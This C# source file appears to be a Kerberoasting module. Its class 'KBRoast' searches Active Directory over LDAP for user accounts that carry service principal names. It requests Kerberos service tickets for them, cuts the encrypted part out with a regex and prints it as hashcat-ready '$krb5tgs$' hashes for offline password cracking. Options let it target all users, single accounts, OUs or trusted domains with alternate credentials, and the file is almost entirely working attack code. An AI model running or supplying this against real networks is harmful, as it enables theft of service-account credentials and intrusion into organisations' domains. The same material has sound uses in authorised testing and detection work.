using System;
using System.Text.RegularExpressions;
using System.DirectoryServices;
using System.Security.Principal;
using System.DirectoryServices.AccountManagement;
using System.Text;
using System.Collections.Generic;
using System.IdentityModel.Tokens;

namespace DCEnumNC
{
    class KBRoast
    {
        static readonly bool debug = false;


        // helper to wrap output strings
        private static IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        private static string GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null)
        {

            StringBuilder sb = new StringBuilder();
            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                // extract the domain name from the distinguishedname
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                domain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            try
            {
                if (debug) sb.Append("[DEBUG] (GetDomainSPNTicket) getting SPN ticket for SPN: " + spn);
                // request a new ticket
                KerberosRequestorSecurityToken ticket = new KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());

                byte[] requestBytes = ticket.GetRequest();
                string ticketHexStream = BitConverter.ToString(requestBytes).Replace("-", "");

                // janky regex to try to find the part of the service ticket we want
                Match match = Regex.Match(ticketHexStream, @"a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)", 
                    RegexOptions.IgnoreCase);

                if (match.Success)
                {
                    // usually 23 rc4-hmac
                    byte eType = Convert.ToByte(match.Groups["EtypeLen"].ToString(), 16);

                    int cipherTextLen = Convert.ToInt32(match.Groups["CipherTextLen"].ToString(), 16) - 4;
                    string dataToEnd = match.Groups["DataToEnd"].ToString();
                    string cipherText = dataToEnd.Substring(0, cipherTextLen * 2);

                    if (match.Groups["DataToEnd"].ToString().Substring(cipherTextLen * 2, 4) != "A482")
                    {
                        sb.Append(" [X] Error parsing ciphertext for the SPN {0}. Use the TicketByteHexStream to extract the hash offline with Get-KerberoastHashFromAPReq: " + 
                            spn);
                        sb.Append(Environment.NewLine);

                        bool header = false;
                        foreach (string line in Split(ticketHexStream, 80))
                        {
                            if (!header)
                            {
                                sb.Append("TicketHexStream        : " + line);
                            }
                            else
                            {
                                sb.Append("                         " + line);
                            }
                            sb.Append(Environment.NewLine);
                            header = true;
                        }
                       
                    }
                    else
                    {
                        // output to hashcat format
                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", eType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));

                        bool header = false;
                        foreach (string line in Split(hash, 80))
                        {
                            if (!header)
                            {
                                sb.AppendFormat("Hash                   : {0}", line);
                            }
                            else
                            {
                                sb.AppendFormat("                         {0}", line);
                            }
                            sb.Append(Environment.NewLine);
                            header = true;
                        }
                        
                    }
                }
            }
            catch (Exception ex)
            {
                sb.Append(Environment.NewLine);
                sb.AppendFormat("Error during request for SPN {0} : {1} ", spn, ex.InnerException.Message);
            }

            return sb.ToString();
        }

        private static string Kerberoast(string userName = "", string OUName = "", System.Net.NetworkCredential cred = null)
        {

            StringBuilder sb = new StringBuilder();
            string bindPath = "";

            DirectoryEntry directoryObject;
            DirectorySearcher userSearcher;
            try
            {
                if (cred != null)
                {
                    if (!String.IsNullOrEmpty(OUName))
                    {
                        string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
                        bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
                    }
                    else
                    {
                        bindPath = String.Format("LDAP://{0}", cred.Domain);
                    }
                }
                else if (!String.IsNullOrEmpty(OUName))
                {
                    bindPath = OUName.Replace("ldap", "LDAP");
                }

                if (!String.IsNullOrEmpty(bindPath))
                {
                    if (debug) sb.AppendFormat("[DEBUG] bindPath: {0}", bindPath);
                    sb.Append(Environment.NewLine);
                    directoryObject = new DirectoryEntry(bindPath);
                }
                else
                {
                    directoryObject = new DirectoryEntry();
                }

                if (cred != null)
                {
                    // if we're using alternate credentials for the connection
                    string userDomain = String.Format("{0}\\{1}", cred.Domain, cred.UserName);
                    directoryObject.Username = userDomain;
                    directoryObject.Password = cred.Password;
                    if (debug) sb.AppendFormat("[DEBUG] validating alternate credentials: {0}", userDomain);

                    using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain))
                    {
                        if (!pc.ValidateCredentials(cred.UserName, cred.Password))
                        {
                            sb.Append(Environment.NewLine);
                            sb.AppendFormat("[X]Credentials supplied for '{0}' are invalid!", userDomain);
                            return sb.ToString();
                        }
                    }
                }

                userSearcher = new DirectorySearcher(directoryObject);
            }
            catch (Exception ex)
            {
                sb.Append(Environment.NewLine);
                sb.AppendFormat("\r\n [X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                return sb.ToString();
            }

            // check to ensure that the bind worked correctly
            try
            {
                Guid guid = directoryObject.Guid;
            }
            catch (DirectoryServicesCOMException ex)
            {
                sb.Append(Environment.NewLine);
                if (!String.IsNullOrEmpty(OUName))
                {
                    
                    sb.AppendFormat("[X] Error creating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
                }
                else
                {
                    sb.AppendFormat("[X] Error creating the domain searcher: {0}", ex.Message);
                }
                return sb.ToString();
            }

            try
            {
                if (String.IsNullOrEmpty(userName))
                {
                    userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))";
                }
                else
                {
                    userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0}))", userName);
                }
            }
            catch (Exception ex)
            {
                sb.Append(Environment.NewLine);
                sb.AppendFormat("[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                return sb.ToString();
            }

            if (debug) sb.AppendFormat("[DEBUG] search filter: {0}", userSearcher.Filter);

            try
            {
                SearchResultCollection users = userSearcher.FindAll();

                foreach (SearchResult user in users)
                {
                    string samAccountName = user.Properties["samAccountName"][0].ToString();
                    string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                    string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
                    sb.AppendFormat("SamAccountName         : {0}", samAccountName);
                    sb.Append(Environment.NewLine);
                    sb.AppendFormat("DistinguishedName      : {0}", distinguishedName);
                    sb.Append(Environment.NewLine);
                    sb.AppendFormat("ServicePrincipalName   : {0}", servicePrincipalName);
                    sb.Append(Environment.NewLine);
                    sb.Append(GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred));
                    sb.Append(Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                sb.Append(Environment.NewLine);
                sb.AppendFormat("[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                return sb.ToString();
            }

            return sb.ToString();
        }

        #region Parameters
        /************************************************************************************************************
               all                                 -   Roast all users in current domain
               domain.com\user\password            -   Roast all users in current domain using alternate creds
               blah/blah                           -   Roast a specific specific SPN
               blah/blah\domain.com\user\password  -   Roast a specific SPN using alternate creds
               username                            -   Roast a specific username
               username domain.com\user\password   -   Roast a specific username using alternate creds
               OU=blah,DC=testlab,DC=local         -   Roast users from a specific OU
               SERVICE/host@domain.com             -   Roast a specific SPN in another (trusted) domain
               LDAP://DC=dev,DC=testlab,DC=local   -   Roast all users in another (trusted) domain

       *****************************************************************************************************************/
        #endregion

        public static string RoastNow(string[] args)
        {
            
            if (args.Length == 0)
            {
                return "You must provide arguments";
                
            }
            else if ((args.Length == 1) || (args.Length == 3))
            {
                System.Net.NetworkCredential cred = null;

                if (args.Length == 3)
                {
                    if (!Regex.IsMatch(args[1], ".+\\\\.+", RegexOptions.IgnoreCase))
                    {
                        return "Invalid arguments";
                        
                    }
                    else
                    {
                        string[] parts = args[1].Split('\\');
                        string domainName = parts[0];
                        string userName = parts[1];
                        string password = args[2];

                        if (!Regex.IsMatch(domainName, ".+\\..+", RegexOptions.IgnoreCase))
                        {

                            return "User specification must be in fqdn format(domain.com\\user)"; 
                            
                        }

                        // create the new credential
                        cred = new System.Net.NetworkCredential(userName, password, domainName);
                    }
                }

                if (Regex.IsMatch(args[0], "all", RegexOptions.IgnoreCase))
                {
                    return Kerberoast("", "", cred);
                }

                else if (Regex.IsMatch(args[0], "^ldap://", RegexOptions.IgnoreCase))
                {
                    // specific LDAP bind path, so roast users just from that OU/whatnot
                    return Kerberoast("", args[0], cred);
                }
                else if (Regex.IsMatch(args[0], "^OU=.*", RegexOptions.IgnoreCase))
                {
                    // specific OU, so roast users just from that OU
                   return Kerberoast("", String.Format("LDAP://{0}", args[0]), cred);
                }
                else if (Regex.IsMatch(args[0], ".+/.+", RegexOptions.IgnoreCase))
                {
                    // SPN format (SERVICE/HOST)
                    return GetDomainSPNTicket(args[0], "", "", cred);
                }
                else
                {
                    // assume username format
                    return Kerberoast(args[0], "", cred);
                }
            }
            else
            {
                return "Invalid arguments";
            }
        }
    }
}
